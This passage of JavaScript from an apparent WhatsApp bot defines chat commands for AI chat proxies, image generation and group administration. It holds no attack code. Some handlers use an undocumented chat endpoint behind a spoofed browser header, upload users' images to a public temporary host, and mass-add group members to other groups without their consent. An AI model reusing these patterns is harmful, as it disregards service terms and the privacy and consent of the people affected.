      }, { quoted: m })
    } else {
      reply('❌ Gemini AI not responding.')
    }
  } catch (err) {
    console.error('Gemini Error:', err)
    reply('❌ Gemini service unavailable.')
  }
}
break

case 'meta':
case 'metaai':
case 'llama': {
  if (!text) return reply(`🦙 Usage: ${prefix}meta <question>\n\nExample: ${prefix}meta What is the meaning of life?`)
  
  await empire.sendMessage(m.chat, { react: { text: '🦙', key: m.key } })
  
  try {
    const response = await axios.get(`https://apis.prexzyvilla.site/ai/meta-ai?text=${encodeURIComponent(text)}`)
    
    if (response.data && response.data.status) {
      const answer = response.data.data || response.data.result
      
      await empire.sendMessage(m.chat, {
        text: `🦙 *META LLAMA RESPONSE*\n\n❓ ${text}\n\n💬 ${answer}`
      }, { quoted: m })
    } else {
      reply('❌ Meta AI not responding.')
    }
  } catch (err) {
    console.error('Meta AI Error:', err)
    reply('❌ Meta AI service error.')
  }
}
break

case 'deepseek':
case 'ds': {
  if (!text) return reply(`🔍 Usage: ${prefix}deepseek <question>\n\nExample: ${prefix}deepseek Explain machine learning`)
  
  await empire.sendMessage(m.chat, { react: { text: '🔍', key: m.key } })
  
  try {
    const response = await axios.get(`https://apis.prexzyvilla.site/ai/deepseek?text=${encodeURIComponent(text)}`)
    
    if (response.data && response.data.success) {
      const answer = response.data.result || response.data.data
      
      await empire.sendMessage(m.chat, {
        text: `🔍 *DEEPSEEK AI*\n\n📝 ${text}\n\n✅ ${answer}`
      }, { quoted: m })
    } else {
      reply('❌ Deepseek not responding.')
    }
  } catch (err) {
    console.error('Deepseek Error:', err)
    reply('❌ Deepseek service error.')
  }
}
break

case 'grok':
case 'xai': {
  if (!text) return reply(`⚡ Usage: ${prefix}grok <question>\n\nExample: ${prefix}grok What's trending on X?`)
  
  await empire.sendMessage(m.chat, { react: { text: '⚡', key: m.key } })
  
  try {
    const response = await axios.get(`https://apis.prexzyvilla.site/ai/grok?text=${encodeURIComponent(text)}`)
    
    if (response.data && response.data.status) {
      const answer = response.data.data || response.data.result
      
      await empire.sendMessage(m.chat, {
        text: `⚡ *GROK AI (xAI)*\n\n🔥 ${text}\n\n💬 ${answer}`
      }, { quoted: m })
    } else {
      reply('❌ Grok AI not responding.')
    }
  } catch (err) {
    console.error('Grok Error:', err)
    reply('❌ Grok service error.')
  }
}
break

case 'claude':
case 'anthropic': {
  if (!text) return reply(`🎯 Usage: ${prefix}claude <question>\n\nExample: ${prefix}claude Explain ethics in AI`)
  
  await empire.sendMessage(m.chat, { react: { text: '🎯', key: m.key } })
  
  try {
    const response = await axios.post("https://api.anthropic.com/v1/messages", {
      model: "claude-3-sonnet-20240229",
      max_tokens: 1000,
      messages: [{ role: "user", content: text }]
    }, {
      headers: {
        "x-api-key": "YOUR_CLAUDE_API_KEY",
        "anthropic-version": "2023-06-01",
        "Content-Type": "application/json"
      }
    })
    
    const answer = response.data.content[0].text
    await empire.sendMessage(m.chat, {
      text: `🎯 *CLAUDE AI (Anthropic)*\n\n❓ ${text}\n\n💭 ${answer}`
    }, { quoted: m })
  } catch (err) {
    // Fallback to free API
    try {
      const response = await axios.get(`https://apis.prexzyvilla.site/ai/claude?text=${encodeURIComponent(text)}`)
      const answer = response.data.data || response.data.result
      await empire.sendMessage(m.chat, { text: `🎯 *CLAUDE AI*\n\n${answer}` }, { quoted: m })
    } catch {
      reply('❌ Claude AI unavailable.')
    }
  }
}
break

case 'imagine':
case 'generate':
case 'draw': {
  if (!text) return reply(`🎨 Usage: ${prefix}imagine <prompt>\n\nExample: ${prefix}imagine A beautiful sunset over mountains`)
  
  await empire.sendMessage(m.chat, { react: { text: '🎨', key: m.key } })
  await empire.sendMessage(m.chat, { text: '🎨 Generating image... Please wait.' }, { quoted: m })
  
  try {
    const response = await axios.get(`https://apis.prexzyvilla.site/ai/imagen?prompt=${encodeURIComponent(text)}&ratio=1:1`)
    
    if (response.data && response.data.status && response.data.result) {
      await empire.sendMessage(m.chat, {
        image: { url: response.data.result },
        caption: `🎨 *AI GENERATED IMAGE*\n\n📝 Prompt: ${text}\n\n✨ Generated by ZUKO XMD AI`
      }, { quoted: m })
      
      await empire.sendMessage(m.chat, { react: { text: '🖼️', key: m.key } })
    } else {
      reply('❌ Failed to generate image. Try different prompt.')
    }
  } catch (err) {
    console.error('Imagine Error:', err)
    reply('❌ Image generation failed.')
  }
}
break

case 'imagine2':
case 'generate2':
case 'stable': {
  if (!text) return reply(`🎨 Usage: ${prefix}generate2 <prompt>\n\nExample: ${prefix}generate2 A cyberpunk city`)
  
  await empire.sendMessage(m.chat, { react: { text: '🎨', key: m.key } })
  
  try {
    const response = await axios.get(`https://image.pollinations.ai/prompt/${encodeURIComponent(text)}?width=1024&height=1024&nologo=true&enhance=true`)
    
    await empire.sendMessage(m.chat, {
      image: { url: response.config.url },
      caption: `🎨 *STABLE DIFFUSION*\n\n📝 ${text}\n\n⚡ Powered by ZUKO XMD`
    }, { quoted: m })
  } catch (err) {
    console.error('Stable Diffusion Error:', err)
    reply('❌ Image generation failed.')
  }
}
break

case 'remix':
case 'editimage': {
  if (!text) return reply(`🖌️ Usage: ${prefix}remix <edit instruction>\n\nReply to an image with: ${prefix}remix make it look like a painting`)
  
  if (!m.quoted || !/image/.test(m.quoted.mimetype || '')) {
    return reply('🖌️ Reply to an image with your edit instruction.')
  }
  
  await empire.sendMessage(m.chat, { react: { text: '🖌️', key: m.key } })
  
  try {
    // Download the image
    const media = await m.quoted.download()
    const imageBase64 = media.toString('base64')
    
    // Upload to temporary hosting
    const formData = new FormData()
    formData.append('image', media, 'image.jpg')
    
    const uploadRes = await axios.post('https://tmp.ninja/api.php?d=upload&output=json', formData, {
      headers: { 'Content-Type': 'multipart/form-data' }
    })
    
    const imageUrl = uploadRes.data.files[0].url
    
    // Edit with AI
    const editRes = await axios.get(`https://apis.prexzyvilla.site/ai/edit-image?url=${encodeURIComponent(imageUrl)}&prompt=${encodeURIComponent(text)}`)
    
    if (editRes.data && editRes.data.result) {
      await empire.sendMessage(m.chat, {
        image: { url: editRes.data.result },
        caption: `🖌️ *EDITED IMAGE*\n\n✏️ ${text}\n\n✅ Edit complete!`
      }, { quoted: m })
    } else {
      reply('❌ Image editing failed.')
    }
  } catch (err) {
    console.error('Remix Error:', err)
    reply('❌ Failed to edit image.')
  }
}
break

case 'imagechat':
case 'vision': {
  if (!m.quoted || !/image/.test(m.quoted.mimetype || '')) {
    return reply(`👁️ Reply to an image with your question.\n\nUsage: ${prefix}vision What's in this image?`)
  }
  
  const question = text || 'Describe this image in detail'
  
  await empire.sendMessage(m.chat, { react: { text: '👁️', key: m.key } })
  await empire.sendMessage(m.chat, { text: '🔍 Analyzing image...' }, { quoted: m })
  
  try {
    // Download image
    const media = await m.quoted.download()
    
    // Upload to temporary hosting
    const formData = new FormData()
    formData.append('image', media, 'image.jpg')
    
    const uploadRes = await axios.post('https://tmp.ninja/api.php?d=upload&output=json', formData, {
      headers: { 'Content-Type': 'multipart/form-data' }
    })
    
    const imageUrl = uploadRes.data.files[0].url
    
    // Vision API call
    const response = await axios.post('https://chateverywhere.app/api/chat/', {
      model: { id: "gpt-4-vision", name: "GPT-4 Vision" },
      messages: [{
        pluginId: null,
        content: `${question}\n\nImage URL: ${imageUrl}`,
        role: "user"
      }],
      temperature: 0.7
    }, {
      headers: {
        "Accept": "*/*",
        "User-Agent": "Mozilla/5.0"
      }
    })
    
    await empire.sendMessage(m.chat, {
      text: `👁️ *VISION AI ANALYSIS*\n\n❓ ${question}\n\n💬 ${response.data}`
    }, { quoted: m })
  } catch (err) {
    console.error('Vision Error:', err)
    reply('❌ Vision analysis failed.')
  }
}
break

case 'code':
case 'codai': {
  if (!text) return reply(`💻 Usage: ${prefix}code <programming question>\n\nExample: ${prefix}code Write a Python function to reverse a string`)
  
  await empire.sendMessage(m.chat, { react: { text: '💻', key: m.key } })
  
  try {
    const response = await axios.post("https://chateverywhere.app/api/chat/", {
      model: { id: "gpt-4", name: "GPT-4" },
      messages: [{
        pluginId: null,
        content: `You are a coding assistant. Provide clean, working code with brief explanations.\n\n${text}`,
        role: "user"
      }],
      temperature: 0.3
    }, {
      headers: {
        "Accept": "*/*",
        "User-Agent": "Mozilla/5.0"
      }
    })
    
    const codeResponse = response.data
    
    await empire.sendMessage(m.chat, {
      text: `💻 *CODE ASSISTANT*\n\n📝 Request: ${text}\n\n\`\`\`\n${codeResponse}\n\`\`\``
    }, { quoted: m })
  } catch (err) {
    console.error('Code AI Error:', err)
    reply('❌ Code generation failed.')
  }
}
break

case 'translateai':
case 'translate': {
  if (!text) return reply(`🌐 Usage: ${prefix}translate <text> to <language>\n\nExample: ${prefix}translate Hello to Spanish`)
  
  const parts = text.split(' to ')
  if (parts.length !== 2) return reply('❌ Format: translate <text> to <language>')
  
  const textToTranslate = parts[0]
  const targetLang = parts[1]
  
  await empire.sendMessage(m.chat, { react: { text: '🌐', key: m.key } })
  
  try {
    const response = await axios.get(`https://apis.prexzyvilla.site/ai/translate?text=${encodeURIComponent(textToTranslate)}&lang=${encodeURIComponent(targetLang)}`)
    
    if (response.data && response.data.result) {
      await empire.sendMessage(m.chat, {
        text: `🌐 *AI TRANSLATION*\n\n📝 Original: ${textToTranslate}\n🎯 Target: ${targetLang}\n\n✅ Translated: ${response.data.result}`
      }, { quoted: m })
    } else {
      reply('❌ Translation failed.')
    }
  } catch (err) {
    console.error('Translate Error:', err)
    reply('❌ Translation service error.')
  }
}
break

case 'summarize':
case 'summary': {
  if (!text && !m.quoted) return reply(`📝 Usage: ${prefix}summarize <text>\nOr reply to a long message with ${prefix}summarize`)
  
  let longText = text
  
  if (!longText && m.quoted) {
    longText = m.quoted.text || m.quoted.message?.conversation || ''
  }
  
  if (!longText || longText.length < 50) {
    return reply('📝 Provide a longer text (minimum 50 characters) to summarize.')
  }
  
  await empire.sendMessage(m.chat, { react: { text: '📝', key: m.key } })
  
  try {
    const response = await axios.post("https://chateverywhere.app/api/chat/", {
      model: { id: "gpt-4", name: "GPT-4" },
      messages: [{
        pluginId: null,
        content: `Summarize the following text concisely (max 200 words):\n\n${longText}`,
        role: "user"
      }],
      temperature: 0.5
    }, {
      headers: {
        "Accept": "*/*",
        "User-Agent": "Mozilla/5.0"
      }
    })
    
    await empire.sendMessage(m.chat, {
      text: `📝 *AI SUMMARY*\n\n📄 Original Length: ${longText.length} chars\n\n✨ Summary:\n${response.data}`
    }, { quoted: m })
  } catch (err) {
    console.error('Summarize Error:', err)
    reply('❌ Summarization failed.')
  }
}
break

case 'rewrite':
case 'improve': {
  if (!text && !m.quoted) return reply(`✏️ Usage: ${prefix}rewrite <text>\nOr reply to a message with ${prefix}rewrite\n\nImproves grammar and writing style.`)
  
  let originalText = text
  
  if (!originalText && m.quoted) {
    originalText = m.quoted.text || m.quoted.message?.conversation || ''
  }
  
  if (!originalText) return reply('✏️ Please provide text to rewrite.')
  
  await empire.sendMessage(m.chat, { react: { text: '✏️', key: m.key } })
  
  try {
    const response = await axios.post("https://chateverywhere.app/api/chat/", {
      model: { id: "gpt-4", name: "GPT-4" },
      messages: [{
        pluginId: null,
        content: `Rewrite this text to improve grammar, clarity, and style. Keep the meaning same:\n\n${originalText}`,
        role: "user"
      }],
      temperature: 0.6
    }, {
      headers: {
        "Accept": "*/*",
        "User-Agent": "Mozilla/5.0"
      }
    })
    
    await empire.sendMessage(m.chat, {
      text: `✏️ *TEXT IMPROVEMENT*\n\n📝 Original:\n${originalText}\n\n✨ Improved:\n${response.data}`
    }, { quoted: m })
  } catch (err) {
    console.error('Rewrite Error:', err)
    reply('❌ Text improvement failed.')
  }
}
break

case 'brainstorm':
case 'ideas': {
  if (!text) return reply(`💡 Usage: ${prefix}brainstorm <topic>\n\nExample: ${prefix}brainstorm Birthday party ideas`)
  
  await empire.sendMessage(m.chat, { react: { text: '💡', key: m.key } })
  
  try {
    const response = await axios.post("https://chateverywhere.app/api/chat/", {
      model: { id: "gpt-4", name: "GPT-4" },
      messages: [{
        pluginId: null,
        content: `Generate 10 creative ideas about: ${text}. Be innovative and practical.`,
        role: "user"
      }],
      temperature: 0.8
    }, {
      headers: {
        "Accept": "*/*",
        "User-Agent": "Mozilla/5.0"
      }
    })
    
    await empire.sendMessage(m.chat, {
      text: `💡 *BRAINSTORMING: ${text}*\n\n${response.data}`
    }, { quoted: m })
  } catch (err) {
    console.error('Brainstorm Error:', err)
    reply('❌ Idea generation failed.')
  }
}
break

case 'emailai':
case 'writeemail': {
  if (!text) return reply(`📧 Usage: ${prefix}email <purpose>\n\nExample: ${prefix}email Request a meeting with the team`)
  
  await empire.sendMessage(m.chat, { react: { text: '📧', key: m.key } })
  
  try {
    const response = await axios.post("https://chateverywhere.app/api/chat/", {
      model: { id: "gpt-4", name: "GPT-4" },
      messages: [{
        pluginId: null,
        content: `Write a professional email about: ${text}. Include subject, greeting, body, and signature.`,
        role: "user"
      }],
      temperature: 0.6
    }, {
      headers: {
        "Accept": "*/*",
        "User-Agent": "Mozilla/5.0"
      }
    })
    
    await empire.sendMessage(m.chat, {
      text: `📧 *AI GENERATED EMAIL*\n\n${response.data}\n\n---\n⚡ Generated by ZUKO XMD`
    }, { quoted: m })
  } catch (err) {
    console.error('Email AI Error:', err)
    reply('❌ Email generation failed.')
  }
}
break

case 'explain':
case 'explainai': {
  if (!text) return reply(`📚 Usage: ${prefix}explain <concept>\n\nExample: ${prefix}explain Quantum Physics in simple terms`)
  
  await empire.sendMessage(m.chat, { react: { text: '📚', key: m.key } })
  
  try {
    const response = await axios.post("https://chateverywhere.app/api/chat/", {
      model: { id: "gpt-4", name: "GPT-4" },
      messages: [{
        pluginId: null,
        content: `Explain "${text}" in simple, easy-to-understand terms. Use analogies if helpful. Keep it beginner-friendly.`,
        role: "user"
      }],
      temperature: 0.5
    }, {
      headers: {
        "Accept": "*/*",
        "User-Agent": "Mozilla/5.0"
      }
    })
    
    await empire.sendMessage(m.chat, {
      text: `📚 *AI EXPLANATION*\n\n📖 Concept: ${text}\n\n💡 ${response.data}`
    }, { quoted: m })
  } catch (err) {
    console.error('Explain Error:', err)
    reply('❌ Explanation failed.')
  }
}
break
case 'autogreeting': {
  if (!m.isGroup) return reply('❌ This command is only for groups')
  if (!isCreator) return reply('❌ Owner only')
  
  const type = args[0]?.toLowerCase()
  const message = args.slice(1).join(' ')
  
  if (type === 'welcome') {
    if (!message) return reply(`📝 Usage: ${prefix}autogreeting welcome <message>\nUse @user for member name, @group for group name`)
    setSetting(m.chat, 'welcomeMessage', message)
    reply('✅ Custom welcome message saved.')
  } 
  else if (type === 'goodbye') {
    if (!message) return reply(`📝 Usage: ${prefix}autogreeting goodbye <message>\nUse @user for member name, @group for group name`)
    setSetting(m.chat, 'goodbyeMessage', message)
    reply('✅ Custom goodbye message saved.')
  }
  else {
    reply(`📝 Usage:\n${prefix}autogreeting welcome <message>\n${prefix}autogreeting goodbye <message>`)
  }
}
break
// ==================== 20 MORE GROUP COMMANDS (BATCH 4) ====================

case 'autoreact':
case 'autoemoji': {
  if (!m.isGroup) return reply('❌ Group only')
  if (!isCreator) return reply('❌ Owner only')
  
  const mode = args[0]?.toLowerCase()
  const emoji = args[1]
  
  if (!mode || !['on', 'off', 'set'].includes(mode)) {
    return reply(`📝 Usage:\n${prefix}autoreact on\n${prefix}autoreact off\n${prefix}autoreact set 😊\n\nAuto-reacts to messages in group.`)
  }
  
  if (mode === 'set' && emoji) {
    setSetting(m.chat, 'autoReactEmoji', emoji)
    reply(`✅ Auto-react emoji set to ${emoji}`)
  }
  else if (mode === 'on') {
    setSetting(m.chat, 'autoReact', true)
    reply('✅ Auto-react enabled in this group.')
  }
  else if (mode === 'off') {
    setSetting(m.chat, 'autoReact', false)
    reply('❌ Auto-react disabled in this group.')
  }
}
break

case 'autoreply':
case 'customreply': {
  if (!m.isGroup) return reply('❌ Group only')
  if (!isCreator) return reply('❌ Owner only')
  
  const trigger = args[0]?.toLowerCase()
  const response = args.slice(1).join(' ')
  
  if (!trigger || !response) {
    return reply(`📝 Usage: ${prefix}autoreply <trigger> <response>\nExample: ${prefix}autoreply hello Hi there!\n\n${prefix}autoreply list\n${prefix}autoreply remove <trigger>`)
  }
  
  if (trigger === 'list') {
    const replies = db.autoReplies?.[m.chat] || {}
    if (Object.keys(replies).length === 0) return reply('📭 No auto-replies configured.')
    
    let list = '🤖 *AUTO-REPLIES*\n\n'
    for (const [key, value] of Object.entries(replies)) {
      list += `🔹 ${key} → ${value}\n`
    }
    return reply(list)
  }
  
  if (trigger === 'remove') {
    const keyword = response
    if (db.autoReplies?.[m.chat]?.[keyword]) {
      delete db.autoReplies[m.chat][keyword]
      saveDB()
      reply(`✅ Removed auto-reply for "${keyword}"`)
    } else {
      reply(`❌ No auto-reply found for "${keyword}"`)
    }
    return
  }
  
  if (!db.autoReplies) db.autoReplies = {}
  if (!db.autoReplies[m.chat]) db.autoReplies[m.chat] = {}
  
  db.autoReplies[m.chat][trigger] = response
  saveDB()
  reply(`✅ Auto-reply added: "${trigger}" → "${response}"`)
}
break

case 'antibotdebug':
case 'antibotlog': {
  if (!m.isGroup) return reply('❌ Group only')
  if (!isCreator) return reply('❌ Owner only')
  
  const mode = args[0]?.toLowerCase()
  
  if (!mode || !['on', 'off'].includes(mode)) {
    return reply(`📝 Usage: ${prefix}antibotlog on/off\n\nLogs all detected bot activities.`)
  }
  
  setSetting(m.chat, 'antibotlog', mode === 'on')
  reply(`${mode === 'on' ? '✅ Enabled' : '❌ Disabled'} anti-bot logging.`)
}
break

case 'greetingtest':
case 'testwelcome': {
  if (!m.isGroup) return reply('❌ Group only')
  if (!isCreator) return reply('❌ Owner only')
  
  const metadata = await empire.groupMetadata(m.chat)
  const groupName = metadata.subject
  const memberCount = metadata.participants.length
  const welcomeMsg = getSetting(m.chat, 'welcomeMessage', null)
  
  let testMsg = welcomeMsg || '👋 Welcome @user to @group!'
  testMsg = testMsg
    .replace(/@user/g, `@${m.sender.split('@')[0]}`)
    .replace(/@group/g, groupName)
    .replace(/@count/g, memberCount.toString())
  
  await empire.sendMessage(m.chat, {
    text: `🧪 *WELCOME MESSAGE PREVIEW*\n\n${testMsg}`,
    mentions: [m.sender]
  }, { quoted: m })
}
break

case 'farewelltest':
case 'testgoodbye': {
  if (!m.isGroup) return reply('❌ Group only')
  if (!isCreator) return reply('❌ Owner only')
  
  const metadata = await empire.groupMetadata(m.chat)
  const groupName = metadata.subject
  const goodbyeMsg = getSetting(m.chat, 'goodbyeMessage', null)
  
  let testMsg = goodbyeMsg || '👋 Goodbye @user! Sad to see you leave @group 💔'
  testMsg = testMsg
    .replace(/@user/g, `@${m.sender.split('@')[0]}`)
    .replace(/@group/g, groupName)
  
  await empire.sendMessage(m.chat, {
    text: `🧪 *GOODBYE MESSAGE PREVIEW*\n\n${testMsg}`,
    mentions: [m.sender]
  }, { quoted: m })
}
break

case 'chatlock':
case 'lockchat': {
  if (!m.isGroup) return reply('❌ Group only')
  if (!isCreator) return reply('❌ Owner only')
  
  const duration = parseInt(args[0])
  
  if (!duration || duration < 1) {
    return reply(`🔒 Usage: ${prefix}lockchat <minutes>\nExample: ${prefix}lockchat 30\n\nLocks the group for specified minutes.`)
  }
  
  const until = Date.now() + (duration * 60 * 1000)
  
  if (!db.chatLock) db.chatLock = {}
  db.chatLock[m.chat] = until
  saveDB()
  
  await empire.groupSettingUpdate(m.chat, 'announcement')
  reply(`🔒 Chat locked for ${duration} minute(s). Only admins can send messages.`)
  
  setTimeout(async () => {
    if (db.chatLock[m.chat] && Date.now() >= db.chatLock[m.chat]) {
      delete db.chatLock[m.chat]
      await empire.groupSettingUpdate(m.chat, 'not_announcement')
      saveDB()
      await empire.sendMessage(m.chat, { text: '🔓 Chat unlocked. Members can now send messages.' })
    }
  }, duration * 60 * 1000)
}
break

case 'chatunlock':
case 'unlockchat': {
  if (!m.isGroup) return reply('❌ Group only')
  if (!isCreator) return reply('❌ Owner only')
  
  if (!db.chatLock?.[m.chat]) return reply('❌ Chat is not locked.')
  
  delete db.chatLock[m.chat]
  await empire.groupSettingUpdate(m.chat, 'not_announcement')
  saveDB()
  
  reply('🔓 Chat unlocked. Members can now send messages.')
}
break

case 'groupbackup':
case 'backupmembers': {
  if (!m.isGroup) return reply('❌ Group only')
  if (!isCreator) return reply('❌ Owner only')
  
  try {
    const metadata = await empire.groupMetadata(m.chat)
    const participants = metadata.participants
    const backup = {
      groupName: metadata.subject,
      groupId: m.chat,
      timestamp: Date.now(),
      members: participants.map(p => p.id),
      admins: participants.filter(p => p.admin).map(p => p.id),
      total: participants.length
    }
    
    const backupFile = `./backup_${m.chat.replace(/[^0-9]/g, '')}_${Date.now()}.json`
    fs.writeFileSync(backupFile, JSON.stringify(backup, null, 2))
    
    await empire.sendMessage(m.chat, {
      document: fs.readFileSync(backupFile),
      mimetype: 'application/json',
      fileName: `group_backup_${metadata.subject}.json`,
      caption: `📦 *GROUP BACKUP*\n\n📛 Name: ${metadata.subject}\n👥 Members: ${participants.length}\n📅 Date: ${new Date().toLocaleString()}`
    }, { quoted: m })
    
    fs.unlinkSync(backupFile)
  } catch (err) {
    reply('❌ Failed to create backup.')
  }
}
break

case 'restoremembers':
case 'restorebackup': {
  if (!m.isGroup) return reply('❌ Group only')
  if (!isCreator) return reply('❌ Owner only')
  
  if (!m.quoted || !m.quoted.document) {
    return reply(`📦 Usage: Reply to a backup JSON file with: ${prefix}restoremembers`)
  }
  
  try {
    const buffer = await m.quoted.download()
    const backup = JSON.parse(buffer.toString())
    
    if (!backup.members || !Array.isArray(backup.members)) {
      return reply('❌ Invalid backup file format.')
    }
    
    let added = 0
    let failed = 0
    
    for (const member of backup.members) {
      try {
        await empire.groupParticipantsUpdate(m.chat, [member], 'add')
        added++
        await sleep(1000)
      } catch (err) {
        failed++
      }
    }
    
    reply(`✅ Restored ${added} members.\n❌ Failed: ${failed}`)
  } catch (err) {
    reply('❌ Failed to restore from backup.')
  }
}
break

case 'groupstatsreset':
case 'resetstats': {
  if (!m.isGroup) return reply('❌ Group only')
  if (!isCreator) return reply('❌ Owner only')
  
  if (args[0] === 'confirm') {
    db.messageCount[m.chat] = 0
    if (db.activeToday) db.activeToday[m.chat] = new Set()
    saveDB()
    reply('✅ Group statistics reset successfully.')
  } else {
    reply(`⚠️ This will reset all group statistics. Type: ${prefix}resetstats confirm`)
  }
}
break

case 'topactive':
case 'activemembers': {
  if (!m.isGroup) return reply('❌ Group only')
  
  if (!db.messageCount) return reply('❌ No data available yet.')
  
  const userStats = {}
  for (const [user, data] of Object.entries(db.xp?.[m.chat] || {})) {
    userStats[user] = {
      xp: data.xp,
      level: data.level,
      messages: db.messageCount?.[m.chat] || 0
    }
  }
  
  const sorted = Object.entries(userStats)
    .sort((a, b) => b[1].xp - a[1].xp)
    .slice(0, 10)
  
  if (!sorted.length) return reply('❌ No activity data available.')
  
  let text = '🏆 *TOP ACTIVE MEMBERS* 🏆\n\n'
  const mentions = []
  
  sorted.forEach(([user, data], i) => {
    text += `${i + 1}. @${user.split('@')[0]} - Lvl ${data.level} (${data.xp} XP)\n`
    mentions.push(user)
  })
  
  await empire.sendMessage(m.chat, {
    text: text,
    mentions: mentions
  }, { quoted: m })
}
break

case 'inactivemembers':
case 'inactiveusers': {
  if (!m.isGroup) return reply('❌ Group only')
  if (!isCreator) return reply('❌ Owner only')
  
  const days = parseInt(args[0]) || 30
  const cutoff = Date.now() - (days * 24 * 60 * 60 * 1000)
  
  const metadata = await empire.groupMetadata(m.chat)
  const inactive = []
  
  for (const member of metadata.participants) {
    const lastActive = db.lastActive?.[m.chat]?.[member.id] || 0
    if (lastActive < cutoff && !member.admin && member.id !== botNumber) {
      inactive.push(member.id)
    }
  }
  
  if (!inactive.length) return reply(`✅ No inactive members found (${days} days).`)
  
  let text = `⏰ *INACTIVE MEMBERS* (${days} days)\n\n`
  const mentions = []
  
  inactive.slice(0, 50).forEach((user, i) => {
    text += `${i + 1}. @${user.split('@')[0]}\n`
    mentions.push(user)
  })
  
  text += `\nTotal: ${inactive.length} members`
  
  await empire.sendMessage(m.chat, {
    text: text,
    mentions: mentions
  }, { quoted: m })
}
break

case 'warnsettings':
case 'warnconfig': {
  if (!m.isGroup) return reply('❌ Group only')
  if (!isCreator) return reply('❌ Owner only')
  
  const action = args[0]?.toLowerCase()
  const value = parseInt(args[1])
  
  if (action === 'set' && value) {
    setSetting(m.chat, 'maxWarnings', value)
    reply(`✅ Maximum warnings set to ${value}. Users will be kicked after ${value} warnings.`)
  }
  else if (action === 'reset') {
    setSetting(m.chat, 'maxWarnings', 3)
    reply('✅ Maximum warnings reset to default (3).')
  }
  else if (action === 'show') {
    const max = getSetting(m.chat, 'maxWarnings', 3)
    reply(`⚠️ *WARNING SETTINGS*\n\nMax Warnings: ${max}\nAuto-kick: ${max > 0 ? 'Enabled' : 'Disabled'}`)
  }
  else {
    reply(`📝 Usage:\n${prefix}warnsettings show\n${prefix}warnsettings set <number>\n${prefix}warnsettings reset`)
  }
}
break

case 'groupfilter':
case 'spamfilter': {
  if (!m.isGroup) return reply('❌ Group only')
  if (!isCreator) return reply('❌ Owner only')
  
  const action = args[0]?.toLowerCase()
  const word = args.slice(1).join(' ')
  
  if (!db.spamFilters) db.spamFilters = {}
  if (!db.spamFilters[m.chat]) db.spamFilters[m.chat] = []
  
  if (action === 'add' && word) {
    if (!db.spamFilters[m.chat].includes(word.toLowerCase())) {
      db.spamFilters[m.chat].push(word.toLowerCase())
      saveDB()
      reply(`✅ Added "${word}" to spam filter.`)
    }
  }
  else if (action === 'remove' && word) {
    db.spamFilters[m.chat] = db.spamFilters[m.chat].filter(w => w !== word.toLowerCase())
    saveDB()
    reply(`✅ Removed "${word}" from spam filter.`)
  }
  else if (action === 'list') {
    const filters = db.spamFilters[m.chat]
    if (!filters.length) return reply('✅ No spam filters configured.')
    reply(`🚫 *SPAM FILTERS*\n\n${filters.map((f, i) => `${i + 1}. ${f}`).join('\n')}`)
  }
  else if (action === 'clear') {
    db.spamFilters[m.chat] = []
    saveDB()
    reply('✅ All spam filters cleared.')
  }
  else {
    reply(`📝 Usage:\n${prefix}spamfilter add <word>\n${prefix}spamfilter remove <word>\n${prefix}spamfilter list\n${prefix}spamfilter clear`)
  }
}
break

case 'autosync':
case 'syncsettings': {
  if (!m.isGroup) return reply('❌ Group only')
  if (!isCreator) return reply('❌ Owner only')
  
  const mode = args[0]?.toLowerCase()
  
  if (!mode || !['on', 'off'].includes(mode)) {
    return reply(`📝 Usage: ${prefix}autosync on/off\n\nAutomatically syncs bot settings across all groups.`)
  }
  
  setSetting('global', 'autosync', mode === 'on')
  reply(`${mode === 'on' ? '✅ Enabled' : '❌ Disabled'} auto-sync across groups.`)
}
break

case 'groupclone':
case 'clonegroup': {
  if (!m.isGroup) return reply('❌ Group only')
  if (!isCreator) return reply('❌ Owner only')
  
  const newName = text || `${groupMetadata.subject} (Clone)`
  
  try {
    const metadata = await empire.groupMetadata(m.chat)
    const newGroup = await empire.groupCreate(newName, [])
    
    // Clone group settings
    if (metadata.announce) {
      await empire.groupSettingUpdate(newGroup.id, 'announcement')
    }
    
    // Clone description
    if (metadata.desc) {
      await empire.groupUpdateDescription(newGroup.id, metadata.desc)
    }
    
    const code = await empire.groupInviteCode(newGroup.id)
    const link = `https://chat.whatsapp.com/${code}`
    
    reply(`✅ Group cloned successfully!\n\n📛 Name: ${newGroup.subject}\n🔗 Link: ${link}`)
  } catch (err) {
    reply('❌ Failed to clone group.')
  }
}
break

case 'groupmerge':
case 'mergegroups': {
  if (!isCreator) return reply('❌ Owner only')
  
  const targetGroup = args[0]
  if (!targetGroup) return reply(`📝 Usage: ${prefix}groupmerge <target_group_id>\n\nMerges current group into target group.`)
  
  let targetId = targetGroup.includes('@g.us') ? targetGroup : targetGroup + '@g.us'
  
  try {
    const metadata = await empire.groupMetadata(m.chat)
    const participants = metadata.participants
    let added = 0
    
    for (const member of participants) {
      if (member.id !== botNumber) {
        try {
          await empire.groupParticipantsUpdate(targetId, [member.id], 'add')
          added++
          await sleep(1000)
        } catch (err) {}
      }
    }
    
    reply(`✅ Merged ${added} members into target group.`)
  } catch (err) {
    reply('❌ Failed to merge groups.')
  }
}
break
// ==================== IMAGE GENERATION COMMANDS ====================

case 'draw':
case 'imagine':
case 'create': {
  if (!text) return reply(`🎨 *ZUKO IMAGE GENERATOR*\n\nUsage: ${prefix}draw <prompt>\n\nExample: ${prefix}draw A beautiful sunset over mountains with golden clouds\n\n🎭 Styles: realistic, anime, cyberpunk, fantasy, watercolor, oil painting, sketch, 3d render, cinematic, studio ghibli, pixel art`)
  
  await empire.sendMessage(m.chat, { react: { text: '🎨', key: m.key } })
  
  const waitMsg = await empire.sendMessage(m.chat, { text: '🎨 *Generating your image...*\n⏳ Please wait, this may take 10-30 seconds.' }, { quoted: m })
  
  try {
    // Enhanced prompt with quality boosters
    const enhancedPrompt = `${text}, high quality, 4k, detailed, masterpiece, trending on artstation, beautiful composition, vibrant colors`
    
    const response = await axios.get(`https://apis.prexzyvilla.site/ai/imagen?prompt=${encodeURIComponent(enhancedPrompt)}&ratio=1:1`)
    
    if (response.data && response.data.status && response.data.result) {
      await empire.sendMessage(m.chat, {
        image: { url: response.data.result },
        caption: `🎨 *ZUKO AI ARTIST*\n\n📝 Prompt: ${text}\n✨ Style: AI Generated\n🎭 Resolution: 1024x1024\n\n⚡ Powered by ZUKO XMD V4`
      }, { quoted: m })
      
      await empire.sendMessage(m.chat, { react: { text: '✨', key: m.key } })
      await empire.sendMessage(m.chat, { delete: waitMsg.key })
    } else {
      throw new Error('No image generated')
    }
  } catch (err) {
    console.error('Draw Error:', err)
    await empire.sendMessage(m.chat, { delete: waitMsg.key })
